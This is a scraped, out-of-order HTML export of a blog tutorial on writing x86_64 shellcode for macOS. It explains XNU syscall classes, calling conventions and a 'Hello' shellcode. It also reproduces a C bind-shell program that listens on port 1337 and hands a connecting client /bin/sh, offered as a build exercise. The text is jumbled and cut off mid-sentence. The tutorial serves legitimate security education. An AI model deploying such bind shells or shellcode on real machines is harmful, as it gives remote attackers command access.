gatorface, modified by community. See post &#x27;Timeline&#x27; for change history</span></span><br><span class=\"line\"><span class=\"comment\">// Retrieved 2025-11-10, License - CC BY-SA 3.0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Author:  Julien Ahrens (@MrTuxracer)</span></span><br><span class=\"line\"><span class=\"comment\">// Website:  http://www.rcesecurity.com </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/socket.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;netinet/in.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> i; <span class=\"comment\">// used for dup2 later</span></span><br><span class=\"line\">    <span class=\"type\">int</span> sockfd; <span class=\"comment\">// socket file descriptor</span></span><br><span class=\"line\">    <span class=\"type\">int</span> clientfd; <span class=\"comment\">// client file descriptor</span></span><br><span class=\"line\">    <span class=\"type\">socklen_t</span> socklen; <span class=\"comment\">// socket-length for new connections</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sockaddr_in</span> <span class=\"title\">srv_addr</span>;</span> <span class=\"comment\">// server aka listen address</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sockaddr_in</span> <span class=\"title\">cli_addr</span>;</span> <span class=\"comment\">// client address</span></span><br><span class=\"line\"></span><br><span class=\"line\">    srv_addr.sin_family = AF_INET; <span class=\"comment\">// server socket type address family = internet protocol address</span></span><br><span class=\"line\">    srv_addr.sin_port = htons( <span class=\"number\">1337</span> ); <span class=\"comment\">// server port, converted to network byte order</span></span><br><span class=\"line\">    srv_addr.sin_addr.s_addr = htonl (INADDR_ANY); <span class=\"comment\">// listen on any address, converted to network byte order</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// create new TCP socket</span></span><br><span class=\"line\">    sockfd = socket(<span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// bind socket</span></span><br><span class=\"line\">    bind( sockfd, (<span class=\"keyword\">struct</span> sockaddr *)&amp;srv_addr, <span class=\"keyword\">sizeof</span>(srv_addr) );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// listen on socket</span></span><br><span class=\"line\">    listen(sockfd, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// accept new connections</span></span><br><span class=\"line\">    socklen = <span class=\"keyword\">sizeof</span>(cli_addr);</span><br><span class=\"line\">    clientfd = accept(sockfd, (<span class=\"keyword\">struct</span> sockaddr *)&amp;cli_addr, &amp;socklen );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// dup2-loop to redirect stdin(0), stdout(1) and stderr(2)</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">2</span>; i++)</span><br><span class=\"line\">        dup2(clientfd, i);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// magic</span></span><br><span class=\"line\">    <span class=\"comment\">// execve( &quot;/bin/sh&quot;, NULL, NULL );</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//UPDATE: fixed exec call, shell still not returned to</span></span><br><span class=\"line\">    <span class=\"comment\">// client connecting with execl or proper execve</span></span><br><span class=\"line\">    execl(<span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"string\">&quot;/bin/sh&quot;</span>, (<span class=\"type\">char</span> *)<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>Tasks:</p>\n<ul>\n<li>Use <code>execve()</code> instead of <code>execl</code></li>\n<li>Collect the syscall for <code>socket</code>,<code>bind</code>,<code>listen</code>,<code>accept</code> and <code>dup2</code>. As you will use it to build your <code>BindShell</code>.</li>\n<li>Study the functions arguments and get it ready for the functions&#x2F;syscalls</li>\n<li>Make sure to go around with the <code>struct</code>, Cause it‚Äôs similler to the way we built arrays</li>\n<li>Make sure to use the kernel source code to hop-around to find a variable value, like the <code>#define AF_INET</code> for example and explore the source code to help you creating your shellcode.</li>\n</ul>\n<h2 id=\"Help\"><a href=\"#Help\" class=\"headerlink\" title=\"Help ?\"></a>Help ?</h2><p>If you got any questions or need help, You can contact me:</p>\n<ul>\n<li><a href=\"https://www.linkedin.com/in/zer0verflow/\">Linkedin</a></li>\n<li><a href=\"https://x.com/AzimaZeyad\">Twitter&#x2F;X</a></li>\n<li>Email: <a href=\"mailto:&#x63;&#111;&#110;&#116;&#x61;&#99;&#x74;&#x40;&#x7a;&#101;&#121;&#97;&#100;&#x61;&#122;&#x69;&#x6d;&#x61;&#x2e;&#x63;&#x6f;&#x6d;\">contact@zeyadazima.com</a></li>\n<li>Discord: <code>.killer_1337</code> including <code>.</code></li>\n</ul>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>We explored the fundamentals of writing shellcode on <code>macOS</code> for the <code>x86_64</code> architecture. We set up a proper lab environment, understood the <code>XNU</code> kernel and its syscall classes, and clarified calling conventions and register usage crucial for crafting shellcode. By following a structured workflow‚Äîstarting from <code>C</code> code, identifying syscalls, converting to assembly, and handling arguments‚Äîwe successfully created shellcodes for printing text, terminating processes, and executing commands. Through these examples, we demonstrated practical techniques such as handling arguments on the stack, using position-independent code, and correctly invoking syscalls in the <code>BSD</code> subsystem of <code>macOS</code>. This foundation sets the stage for more advanced topics.</p>\n<h1 id=\"References\"><a href=\"#References\" class=\"headerlink\" title=\"References\"></a>References</h1><ul>\n<li><a href=\"https://codebrowser.dev/\">https://codebrowser.dev/</a></li>\n<li><a href=\"https://man.freebsd.org/\">https://man.freebsd.org/</a></li>\n<li><a href=\"https://pubs.opengroup.org/\">https://pubs.opengroup.org</a></li>\n<li><a href=\"https://man7.org/linux/man-pages/\">https://man7.org/linux/man-pages/</a></li>\n<li><a href=\"https://opensource.apple.com/releases/\">https://opensource.apple.com/releases/</a></li>\n<li><a href=\"https://github.com/apple-oss-distributions/xnu\">https://github.com/apple-oss-distributions/xnu</a></li>\n<li><a href=\"https://xcodereleases.com/\">https://xcodereleases.com</a></li>\n<li><a href=\"https://newosxbook.com/\">https://newosxbook.com</a></li>\n</ul>\n","excerpt":"","more":"<h1 id=\"Introduction\"><a href=\"#Introduction\" class=\"headerlink\" title=\"Introduction\"></a>Introduction</h1><p>This guide explores shellcoding on the <code>x86_64</code> architecture for <code>macOS</code>, bypassing the traditional x86 starting point for a practical reason: with the release of macOS 10.15 (<code>Catalina</code>), Apple discontinued support for <code>32-bit</code> applications entirely. Since <code>x86_64</code> maintains backward compatibility with x86 code anyway, focusing on <code>64-bit</code> shellcoding makes the most sense for modern <code>macOS</code> systems. Before diving in, you‚Äôll need at least a basic understanding of assembly language‚Äîthis isn‚Äôt an assembly tutorial, so if you‚Äôre unfamiliar with the fundamentals, take some time to learn them first and return when you‚Äôre ready for the challenge. Rather than immediately jumping into cryptic assembly instructions, this guide follows a practical workflow: start by writing code in <code>C</code>, identify the necessary system calls, and then translate everything into assembly. This approach leverages the wealth of existing <code>C</code> documentation and resources, making the process significantly more manageable. You‚Äôll find countless examples of how to build network clients, manipulate processes, or execute commands in <code>C</code>, but you‚Äôd be hard-pressed to find someone talking about implementing these same tasks purely in assembly. Let‚Äôs start with our Blogpost.</p>\n<blockquote>\n<p>You can find all the code on my github: <a href=\"https://github.com/Zeyad-Azima/macOShellcoding\">https://github.com/Zeyad-Azima/macOShellcoding</a></p>\n</blockquote>\n<h1 id=\"Lab-Setup\"><a href=\"#Lab-Setup\" class=\"headerlink\" title=\"Lab Setup\"></a>Lab Setup</h1><p>Let‚Äôs Setup our Lab and the required tools, Let‚Äôs list all the other tools we need. </p>\n<ul>\n<li>Homebrew</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">/bin/bash -c <span class=\"string\">&quot;<span class=\"subst\">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Xcode:</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">We can download it from `AppStore`.</span><br><span class=\"line\">or: https://xcodereleases.com</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Xcode Command Line Tools (CLT)</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">xcode-select --install</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Nasm</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">brew install nasm</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Binutils (<code>ld</code>)</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">brew install binutils</span><br></pre></td></tr></table></figure>\n\n<p>Before we go on straight to shellcoding, We need to understand some FUNDAMENTALS first we would be using to be able to write shellcodes. As we know the macos kernel (<code>XNU</code>) is a hybrid kernel which contains also <code>BSD</code>. We need to download the <code>XNU</code> source code. Cause we will use it for references in creating ours shellcodes and understanding <code>syscalls</code> on <code>macOS</code>. We can download it from <a href=\"https://opensource.apple.com/releases/\">here</a>.</p>\n<p>Now, We need to download the source code version that matches the macOS you writing the shellcode for. I am on <code>macOS Sequoia</code> and the version is <code>macOS 15.5</code>. You can use <code>sw_vers</code> command to check it.</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">~ % sw_vers</span><br><span class=\"line\">ProductName:\t\tmacOS</span><br><span class=\"line\">ProductVersion:\t\t15.5</span><br><span class=\"line\">BuildVersion:\t\t24F74</span><br></pre></td></tr></table></figure>\n\n<p>Now, Let‚Äôs download the <code>XNU</code> VERSION FOR it.</p>\n<p><img src=\"/images/site/posts/macos/xnu-release-page.png\" alt=\"macOS XNU release page\"></p>\n<p>When we scroll down more we can find it.</p>\n<p><img src=\"/images/site/posts/macos/xnu-version-block.png\" alt=\"XNU version block\"></p>\n<p>That‚Äôs the version (<code>xnu-11417.121.6</code>) of <code>macOS 15.5</code>.</p>\n<h1 id=\"XNU-Syscall-Classes\"><a href=\"#XNU-Syscall-Classes\" class=\"headerlink\" title=\"XNU Syscall Classes\"></a>XNU Syscall Classes</h1><p>Now, Let‚Äôs open it with <code>VSCode</code> or your favorite <code>IDE/CodeEditor</code>.</p>\n<p><img src=\"/images/site/posts/macos/xnu-tree.png\" alt=\"XNU source tree in VS Code\"></p>\n<p>All these files and folders for kernel we will use just some of it to understand the basics, But while we writing our shellcodes we would be navigating a lot through different files and folders. First Let‚Äôs go to <code>osfmk/mach/i386/syscall_sw.h</code>.</p>\n<p><img src=\"/images/site/posts/macos/syscall-header.png\" alt=\"syscall header snippet\"></p>\n<p>starting on line <code>135</code> till <code>152</code>, That‚Äôs what matters of us. In here as we know and mentioned before that <code>XNU</code> is hybrid, So if you want to make execute a syscall for related to <code>BSD</code> you would need to define the entry to it.</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SYSCALL_CLASS_SHIFT\t24</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SYSCALL_CLASS_MASK\t(0xFF &lt;&lt; SYSCALL_CLASS_SHIFT)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SYSCALL_NUMBER_MASK\t(~SYSCALL_CLASS_MASK)</span></span><br><span class=\"line\">......</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SYSCALL_CLASS_NONE\t0\t<span class=\"comment\">/* Invalid */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SYSCALL_CLASS_MACH\t1\t<span class=\"comment\">/* Mach */</span>\t</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SYSCALL_CLASS_UNIX\t2\t<span class=\"comment\">/* Unix/BSD */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SYSCALL_CLASS_MDEP\t3\t<span class=\"comment\">/* Machine-dependent */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SYSCALL_CLASS_DIAG\t4\t<span class=\"comment\">/* Diagnostics */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SYSCALL_CLASS_IPC\t5\t<span class=\"comment\">/* Mach IPC */</span></span></span><br></pre></td></tr></table></figure>\n\n<p>In <code>XNU</code> (the kernel underlying <code>macOS</code>, <code>iOS</code>, etc.), system calls are not uniformly accessed via a single syscall table like in <code>Linux</code>. Instead, <code>XNU</code> uses syscall classes to route calls through different subsystems. Each system call class is associated with a unique number, which is shifted left by 24 bits (defined by <code>SYSCALL_CLASS_SHIFT</code>) to determine its class. So for every class to get the entry it will be as the following:</p>\n<table>\n<thead>\n<tr>\n<th>Class</th>\n<th>Name</th>\n<th>Value</th>\n<th>Shifted Base (<code>&lt;&lt; 24</code>)</th>\n<th></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0</td>\n<td><code>SYSCALL_CLASS_NONE</code></td>\n<td>0</td>\n<td><code>0x00000000</code></td>\n<td>Invalid</td>\n</tr>\n<tr>\n<td>1</td>\n<td><code>SYSCALL_CLASS_MACH</code></td>\n<td>1</td>\n<td><code>0x01000000</code></td>\n<td>Mach traps</td>\n</tr>\n<tr>\n<td>2</td>\n<td><code>SYSCALL_CLASS_UNIX</code></td>\n<td>2</td>\n<td><code>0x02000000</code></td>\n<td><strong>BSD syscalls</strong></td>\n</tr>\n<tr>\n<td>3</td>\n<td><code>SYSCALL_CLASS_MDEP</code></td>\n<td>3</td>\n<td><code>0x03000000</code></td>\n<td>Machine-dependent</td>\n</tr>\n<tr>\n<td>4</td>\n<td><code>SYSCALL_CLASS_DIAG</code></td>\n<td>4</td>\n<td><code>0x04000000</code></td>\n<td>Diagnostics</td>\n</tr>\n<tr>\n<td>5</td>\n<td><code>SYSCALL_CLASS_IPC</code></td>\n<td>5</td>\n<td><code>0x05000000</code></td>\n<td>Mach IPC (newer)</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p>BSD &#x3D; 0x02 &lt;&lt; 24 &#x3D; 0x02000000 ‚Üí 0x2000000</p>\n</blockquote>\n<p>The <code>SYSCALL_CLASS_MASK</code> and <code>SYSCALL_NUMBER_MASK</code> are used to extract the class and syscall number respectively. For example, a traditional <code>BSD</code> system call such as <code>execve</code> (system call number <code>59</code> or <code>0x3b</code> in hex) in the <code>SYSCALL_CLASS_UNIX</code> (number <code>2</code>) would be represented as <code>0x200003b</code> when passed to the syscall assembly instruction.</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">; Assembly example to make a syscall with execve (BSD) in macOS</span><br><span class=\"line\">mov rax, 0x200003b  ; Load the syscall number for execve (59 with class mask)</span><br><span class=\"line\">mov rdi, address    ; Address of the command to execute</span><br><span class=\"line\">mov rsi, argv       ; Pointer to an array of arguments</span><br><span class=\"line\">mov rdx, envp       ; Pointer to an array of environment variables</span><br><span class=\"line\">syscall             ; Make the system call</span><br></pre></td></tr></table></figure>\n\n<p>To make it clear, You‚Äôre dining in the <code>XNU</code> restaurant, a multi-level establishment where each floor represents a different system call class, and the kitchen routes your order based on a cleverly encoded ticket. The first floor, <code>SYSCALL_CLASS_MACH</code> (class 1), serves hearty main courses like task and thread operations, while the second floor, <code>SYSCALL_CLASS_UNIX</code> (class 2), specializes in classic <code>BSD</code> desserts such as <code>execve</code> and <code>write</code>. To order a medium-rare steak ‚Äî item number <code>0x3B</code> (59) on the Mach floor ‚Äî you must tell the waiter <code>0x0100003B</code>, calculated as <code>(1 &lt;&lt; 24) | 0x3B</code>. Craving tiramisu (<code>execve</code>, also #59) from the <code>BSD</code> floor? Your order becomes <code>0x0200003B</code> ‚Äî same dish number, different floor, computed as <code>(2 &lt;&lt; 24) | 0x3B</code>. Just like in <code>XNU</code>, never shout just ‚Äú59‚Äù ‚Äî the kitchen needs the full encoded number with the class shifted 24 bits left, ensuring your steak doesn‚Äôt arrive as a dessert (and vice versa). Bon app√©tit in the kernel!</p>\n<h1 id=\"x86-64-Calling-Conventions-and-Registers\"><a href=\"#x86-64-Calling-Conventions-and-Registers\" class=\"headerlink\" title=\"x86_64 Calling Conventions and Registers\"></a>x86_64 Calling Conventions and Registers</h1><p>In the <strong>x86-64 System</strong> used by macOS, function arguments are passed via registers in this order: <code>RDI</code> holds the 1st argument, <code>RSI</code> the 2nd, <code>RDX</code> the 3rd (and sometimes the 2nd return value), <code>RCX</code> the 4th, <code>R8</code> the 5th, and <code>R9</code> the 6th. The return value (or syscall number) is placed in <code>RAX</code>, while <code>RIP</code> points to the next instruction, <code>RSP</code> manages the stack (and must be <strong>16-byte aligned</strong> before any function call), <code>RBP</code> serves as the frame pointer for stack frames, and <code>RBX</code> acts as a general-purpose base register often preserved across calls. If a function requires more than six arguments, additional arguments are passed on the stack. It is essential to ensure that the <code>RSP</code> is properly aligned before making a function call. Despite system calls often working without strict alignment, adhering to this requirement is a good practice to avoid unexpected behavior. To illustrate how these registers are used in a function call, consider a function <code>foo</code> that takes three arguments.</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">; Assume arg1, arg2, and arg3 are already set with appropriate values</span><br><span class=\"line\">mov rax, syscall_number</span><br><span class=\"line\">mov rdi, arg1 ; 1st argument</span><br><span class=\"line\">mov rsi, arg2 ; 2nd argument</span><br><span class=\"line\">mov rdx, arg3 ; 3rd argument</span><br><span class=\"line\">syscall      ; Execute syscall</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Calling-Conventions-Table\"><a href=\"#Calling-Conventions-Table\" class=\"headerlink\" title=\"Calling Conventions Table\"></a>Calling Conventions Table</h2><p>You can use this table as a reference.</p>\n<table>\n<thead>\n<tr>\n<th>Register</th>\n<th>Usage</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>RDI</code></td>\n<td>1st function argument</td>\n</tr>\n<tr>\n<td><code>RSI</code></td>\n<td>2nd function argument</td>\n</tr>\n<tr>\n<td><code>RDX</code></td>\n<td>3rd function argument (and optionally the 2nd return value)</td>\n</tr>\n<tr>\n<td><code>RCX</code></td>\n<td>4th function argument</td>\n</tr>\n<tr>\n<td><code>R8</code></td>\n<td>5th function argument</td>\n</tr>\n<tr>\n<td><code>R9</code></td>\n<td>6th function argument</td>\n</tr>\n<tr>\n<td><code>RAX</code></td>\n<td>Function return value&#x2F;Syscall Number</td>\n</tr>\n<tr>\n<td><code>RIP</code></td>\n<td>Instruction pointer</td>\n</tr>\n<tr>\n<td><code>RSP</code></td>\n<td>Stack pointer (must be 16-byte aligned before calls)</td>\n</tr>\n<tr>\n<td><code>RBP</code></td>\n<td>Frame pointer</td>\n</tr>\n<tr>\n<td><code>RBX</code></td>\n<td>Base pointer (optional use)</td>\n</tr>\n</tbody></table>\n<h1 id=\"Shellcoding\"><a href=\"#Shellcoding\" class=\"headerlink\" title=\"Shellcoding\"></a>Shellcoding</h1><p>Before writing our shellcode, To make it easy for ourselves instead of getting lost in all the assembly instructions, The best workflow to do is to write your code in <code>C</code>, then we convert it to assembly which will make it very easy for us, As there are references and resources for <code>C</code> it will make our process easier. For example, You would find people talking about how to make a client&#x2F;server in <code>C</code> using <code>socket</code>. But, you won‚Äôt find someone(‚Äúinsane‚Äù) talking about how to make a client&#x2F;server in assembly. So The process would be as the following:</p>\n<ul>\n<li>Find <code>C</code> functions that we will need in our code.</li>\n<li>Write our code in <code>C</code>.</li>\n<li>Turn our code into assembly.<ul>\n<li>Which including getting our syscall numbers ready.</li>\n<li>Function arguments and types.</li>\n</ul>\n</li>\n</ul>\n<p>Let‚Äôs go ahead and start with something simple to make things clear.</p>\n<h2 id=\"Print-‚ÄòHello‚Äô\"><a href=\"#Print-‚ÄòHello‚Äô\" class=\"headerlink\" title=\"Print ‚ÄòHello‚Äô\"></a>Print ‚ÄòHello‚Äô</h2><p>We will start by printing <code>Hello</code> into the screen. So let‚Äôs apply our workflow. Usually when we want to print something in <code>C</code>, we use <code>printf()</code> function as the following:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Hello&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Now, As we identified the functions we need which is <code>printf()</code>, And we wrote our code the 3rd step is to turn it into assembly. So the first thing we would need is to get the syscall number for <code>printf()</code>, We can find all the <code>syscalls</code> can be found in <code>bsd/kern/syscalls.master</code>.  </p>\n<p><img src=\"/images/site/posts/macos/syscall-master.png\" alt=\"syscalls master snippet\"></p>\n<p>But, the thing is we won‚Äôt find <code>printf()</code> in the file. Let‚Äôs investigate the <code>printf()</code> function source code. After investigation, the implementation of <code>printf()</code> involves calling other functions till we reach <code>write</code> syscall.</p>\n<h3 id=\"Call-Chain-printf-‚Üí-write-Syscall\"><a href=\"#Call-Chain-printf-‚Üí-write-Syscall\" class=\"headerlink\" title=\"Call Chain: printf ‚Üí write Syscall\"></a>Call Chain: <code>printf</code> ‚Üí <code>write</code> Syscall</h3><table>\n<thead>\n<tr>\n<th>Step</th>\n<th>Function Name</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1</td>\n<td><code>printf</code></td>\n</tr>\n<tr>\n<td>2</td>\n<td><code>vfprintf</code></td>\n</tr>\n<tr>\n<td>3</td>\n<td><code>__vfprintf_internal</code></td>\n</tr>\n<tr>\n<td>4</td>\n<td><code>Xprintf_buffer_write</code></td>\n</tr>\n<tr>\n<td>5</td>\n<td><code>_IO_new_file_overflow</code></td>\n</tr>\n<tr>\n<td>6</td>\n<td><code>_IO_do_write</code></td>\n</tr>\n<tr>\n<td>7</td>\n<td><code>new_do_write</code></td>\n</tr>\n<tr>\n<td>8</td>\n<td><code>_IO_SYSWRITE</code></td>\n</tr>\n<tr>\n<td>9</td>\n<td><code>__swrite</code> <em>(macOS only)</em></td>\n</tr>\n<tr>\n<td>10</td>\n<td><code>write</code> <em>(syscall)</em></td>\n</tr>\n</tbody></table>\n<p>You can find the source code files here:</p>\n<ul>\n<li><a href=\"https://codebrowser.dev/glibc/glibc/stdio-common/printf.c.html\">printf.c</a></li>\n<li><a href=\"https://codebrowser.dev/glibc/glibc/stdio-common/vfprintf.c.html\">vfprintf.c</a></li>\n<li><a href=\"https://codebrowser.dev/glibc/glibc/stdio-common/vfprintf-internal.c.html\">vfprintf-internal.c</a></li>\n<li><a href=\"https://codebrowser.dev/glibc/glibc/stdio-common/printf_buffer.h.html\">printf_buffer.h</a></li>\n<li><a href=\"https://codebrowser.dev/glibc/glibc/libio/fileops.c.html\">fileops.c</a></li>\n<li><a href=\"https://codebrowser.dev/glibc/glibc/libio/libioP.h.html\">libioP.h</a></li>\n</ul>\n<p>Also you could just have asked <code>ChatGPT</code> or something xD, But keep in mind with complicated shellcodes you would want to go through codes and else cause you always will learn something and upgrade yourself.</p>\n<p>Now, When we search for <code>write</code> syscall we can see it in the <code>syscalls.master</code> file:</p>\n<p><img src=\"/images/site/posts/macos/printf-callchain.png\" alt=\"printf call chain trace\"></p>\n<p>As we see the <code>write</code> syscall number is <code>4</code>. And <code>write</code> takes 3 arguments. We need to learn about these argument and how to use it, Which simple can be done by searching it or go to the documentation:</p>\n<p><img src=\"/images/site/posts/macos/printf-flow.png\" alt=\"printf flow diagram\"></p>\n<p>So from the description we can know that we need to supply the string pointer to <code>buf</code> the second argument and number of bytes (<code>length</code>) to the third argument <code>nbyte</code>, And for fields&#x2F;fd or File Descriptor, When we search it we will see that it takes the following values</p>\n<ul>\n<li><code>0 (STDIN_FILENO)</code>: Represents standard input, typically connected to the keyboard or the input of a pipe.</li>\n<li><code>1 (STDOUT_FILENO)</code>: Represents standard output, typically connected to the display or the output of a pipe.</li>\n<li><code>2 (STDERR_FILENO)</code>: Represents standard error, typically connected to the display for error messages.</li>\n</ul>\n<p>Our goal here is <code>STDOUT</code> which is value <code>1</code>. So our syscall will be as the following:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">const</span> <span class=\"type\">char</span> *message = <span class=\"string\">&quot;Hello&quot;</span>;</span><br><span class=\"line\">    write(<span class=\"number\">1</span>, message, <span class=\"number\">5</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Let‚Äôs start with writing our shellcode:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">bits 64</span><br><span class=\"line\"></span><br><span class=\"line\">global _main</span><br><span class=\"line\"></span><br><span class=\"line\">_main:</span><br><span class=\"line\">\tmov rdi, 1 ; stdout for fd argument</span><br><span class=\"line\">\tmov rcx, &#x27;Hello&#x27; ; put our string value into RCX</span><br><span class=\"line\">\tpush rcx ; We push our string to the stack</span><br><span class=\"line\">\tmov rsi, rsp ; we supply the pointer to our string from RSP to RSI which is buf argument</span><br><span class=\"line\">\tmov rdx, 5 ; nbytes argument (our string length)</span><br><span class=\"line\">\tmov rax, 0x2000004 ; The BSD syscall class entry + syscall number</span><br><span class=\"line\">\tsyscall ; invoke/execute syscall</span><br></pre></td></tr></table></figure>\n\n<p>Here our shellcode, starting with <code>bits 64</code> to enforce x86-64 mode and <code>global _main</code> to export the Mach-O entry point. The first instruction <code>mov rdi, 1</code> loads the file descriptor <code>1</code> (stdout) into <code>RDI</code>, the first argument register as we mentioned before. Next, <code>mov rcx, &#39;Hello&#39;</code> encodes the 5-character string as a 64-bit immediate <code>0x6f6c6c6548</code> (little-endian: <code>&#39;o&#39;,&#39;l&#39;,&#39;l&#39;,&#39;e&#39;,&#39;H&#39;</code>) into <code>RCX</code>. The <code>push rcx</code> then writes these 8 bytes to the stack, placing <code>&#39;H&#39;</code> at the new stack pointer and padding the remaining 3 bytes with zeros <code>0x00</code> to align the stack, Then <code>mov rsi, rsp</code> copies the current stack pointer into <code>RSI</code>, Which is the second argument, so it now points directly to the first character <code>&#39;H&#39;</code>, forming a valid <code>char *buf</code>. The <code>mov rdx, 5</code> sets the third argument, which is the number of bytes to write and exactly matching the length of <code>Hello</code>. Finally, <code>mov rax, 0x2000004</code> loads the <code>XNU</code> encoded syscall number: <code>(SYSCALL_CLASS_UNIX &lt;&lt; 24) | 4</code>, where class <code>2</code> routes to the BSD subsystem and <code>4</code> selects the <code>write</code> entry from <code>bsd/kern/syscalls.master</code>. The <code>syscall</code> instruction triggers the kernel trap, dispatching through <code>XNU</code>‚Äôs unified handler to execute <code>write(1, &quot;Hello&quot;, 5)</code>, printing <code>Hello</code> to the terminal.</p>\n<p>Let‚Äôs save our code into file <code>hello.asm</code> and compile our code.</p>\n<ul>\n<li>First we will turn the code to object file for <code>macho64</code> architecture using <code>nasm</code>:</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding % nasm -f macho64 hello.asm</span><br><span class=\"line\">shellcoding % <span class=\"built_in\">ls</span></span><br><span class=\"line\">hello.asm\thello.o</span><br></pre></td></tr></table></figure>\n\n<p>As we see we got our object file <code>hello.o</code>.</p>\n<ul>\n<li>Second, We will link the required libraries needed for the code to generate the executable using <code>ld</code></li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding % ld -o hello hello.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macos 15.5 15.5</span><br><span class=\"line\">ld: warning: no platform load <span class=\"built_in\">command</span> found <span class=\"keyword\">in</span> <span class=\"string\">&#x27;hello.o&#x27;</span>, assuming: macOS</span><br><span class=\"line\">shellcoding % <span class=\"built_in\">ls</span></span><br><span class=\"line\">hello\t\thello.asm\thello.o</span><br></pre></td></tr></table></figure>\n\n<p>Here we can see after linking we got our executable.</p>\n<blockquote>\n<p>Note: The <code>-L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib</code> sets the <strong>library search path</strong> to the macOS 15.5 SDK‚Äôs <code>usr/lib</code> directory, ensuring the linker locates the correct version of <code>libSystem.tbd</code> ‚Äî Apple‚Äôs modern stub library format that resolves to <code>libSystem.dylib</code> at runtime. The <code>-lSystem</code> flag explicitly links against <strong>libSystem</strong>, the foundational system library that exports the <code>syscall</code> interface, <code>write</code>, <code>exit</code>, and all BSD&#x2F;POSIX functions; without it, the <code>syscall</code> instruction in our shellcode would remain unresolved, causing a linker error. Finally, <code>-platform_version macos 15.5 15.5</code> declares the <strong>minimum deployment target</strong> as macOS 15.5 (Sequoia), embedding the <code>LC_VERSION_MIN_MACOSX</code> load command and forcing the use of 